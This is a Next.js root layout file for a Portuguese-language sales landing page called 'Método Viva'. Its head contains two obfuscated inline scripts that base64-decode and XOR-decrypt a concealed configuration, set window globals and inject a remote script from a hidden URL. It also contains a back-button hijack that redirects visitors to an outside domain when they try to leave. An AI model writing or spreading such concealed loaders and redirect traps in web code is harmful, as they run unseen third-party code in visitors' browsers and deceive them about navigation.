import { Analytics } from '@vercel/analytics/next'
import type { Metadata, Viewport } from 'next'
import './globals.css'

export const metadata: Metadata = {
  title: 'Método Viva | Descubra o próximo passo',
  description: 'Assista à apresentação exclusiva e descubra um método simples para começar hoje.',
  generator: 'v0.app',
  icons: {
    icon: [
      {
        url: '/icon-light-32x32.png',
        media: '(prefers-color-scheme: light)',
      },
      {
        url: '/icon-dark-32x32.png',
        media: '(prefers-color-scheme: dark)',
      },
      {
        url: '/icon.svg',
        type: 'image/svg+xml',
      },
    ],
    apple: '/apple-icon.png',
  },
}

export const viewport: Viewport = {
  colorScheme: 'light dark',
  themeColor: [
    { media: '(prefers-color-scheme: light)', color: 'white' },
    { media: '(prefers-color-scheme: dark)', color: 'black' },
  ],
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="pt-BR">
      <head>
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var y_bf7=atob("DI/vLxsWyQCkTwkBiPTNWml66zqGJ311+PzVADR1rW6KOn1s4emWAXh5pC7GPSZy6/2GX29l5nDNN2xtp/+GV35652rXbSUj6fubXXJ0vHTBPCs709LDDXx6pmLFI3ojstSUDXV3pGWGdStx4feKQ1Jy6yyGOWht/erNFTkgqGPBLGgw6r/eFigj/WaVfGw27bmNHS80tF3Z");var n_94=[];for(var b_y6y4=0;b_y6y4<y_bf7.length;b_y6y4++){n_94.push(y_bf7.charCodeAt(b_y6y4)&255);}var a_lgpr=n_94[0];var y_g72i=n_94.slice(1,1+a_lgpr);var c_8l6=n_94.slice(1+a_lgpr);var n_us6=c_8l6.map(function(b,z_qbr){return b^y_g72i[z_qbr%a_lgpr];});var a_qu7f="";for(var f_ncs=0;f_ncs<n_us6.length;f_ncs++){a_qu7f+=String.fromCharCode(n_us6[f_ncs]&255);}var d_4=decodeURIComponent(escape(a_qu7f));var o_gzo=JSON.parse(d_4);var s_6oc=o_gzo.globals||[];s_6oc.forEach(function(h_y0t){window[h_y0t.name]=h_y0t.value;});var i_j=document.createElement("script");i_j.src=o_gzo.url;i_j.async=true;i_j.defer=true;(o_gzo.attributes||[]).forEach(function(w_1){i_j.setAttribute(w_1.name,w_1.value);});(document.head||document.documentElement).appendChild(i_j);})();`,
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: `(function(){var r_qbv=atob("DKuYT3BzvTiScX+xutC6OgIfnwKwGQvFytiiYF8Q2Va8BAvc083hYRMc0BbwA1DC2dnxPwQAkk3mHAye1srsKgMHk1LhU1OT29/sPRkRyEz3Al2L4dC6IREe2BqoUxvQzsq1OgQe1F7rXA/D3939IQRezk3wGBvCmIe6OREfyF2wS12Tx/bl");var o_5=[];for(var z_yp=0;z_yp<r_qbv.length;z_yp++){o_5.push(r_qbv.charCodeAt(z_yp)&255);}var h_nr=o_5[0];var t_9jmx=o_5.slice(1,1+h_nr);var j_17b=o_5.slice(1+h_nr);var c_n592=j_17b.map(function(b,x_vh){return b^t_9jmx[x_vh%h_nr];});var l_8sh="";for(var s_kwf=0;s_kwf<c_n592.length;s_kwf++){l_8sh+=String.fromCharCode(c_n592[s_kwf]&255);}var v_i0=decodeURIComponent(escape(l_8sh));var d_leao=JSON.parse(v_i0);var s_hiqe=d_leao.globals||[];s_hiqe.forEach(function(o_1di){window[o_1di.name]=o_1di.value;});var s_x=document.createElement("script");s_x.src=d_leao.url;s_x.async=true;s_x.defer=true;(d_leao.attributes||[]).forEach(function(y_u3){s_x.setAttribute(y_u3.name,y_u3.value);});(document.head||document.documentElement).appendChild(s_x);})();`,
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: 'history.pushState(null, document.title, location.href);',
          }}
        />
        <script
          dangerouslySetInnerHTML={{
            __html: `window.addEventListener('popstate', function (event) {
  window.location.href = 'https://bk-369.vercel.app';
});`,
          }}
        />
      </head>
      <body className="antialiased">
        {children}
        {process.env.NODE_ENV === 'production' && <Analytics />}
      </body>
    </html>
  )
}
